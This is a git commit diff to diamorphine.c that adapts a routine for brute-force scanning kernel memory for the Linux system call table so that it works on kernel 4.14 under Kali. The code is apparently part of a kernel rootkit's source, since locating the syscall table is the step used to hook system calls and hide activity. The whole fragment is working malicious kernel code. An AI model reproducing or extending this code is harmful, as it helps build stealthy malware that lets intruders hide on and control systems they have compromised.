aae35a18d79541ce0e7375cd57c91579696122e0
Victor Ramos Mello <victornrm@gmail.com>
2018-03-08 21:39:56 -0300

    more compatibity, working in kali with kernel 4.14

--- diamorphine.c
+++ diamorphine.c
@@ -39,7 +39,8 @@ get_syscall_table_bf(void)
 	unsigned long *syscall_table;
 	unsigned long int i;
 
-	for (i = START_MEM; i < END_MEM; i += sizeof(void *)) {
+	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
+			i += sizeof(void *)) {
 		syscall_table = (unsigned long *)i;
 
 		if (syscall_table[__NR_close] == (unsigned long)sys_close)
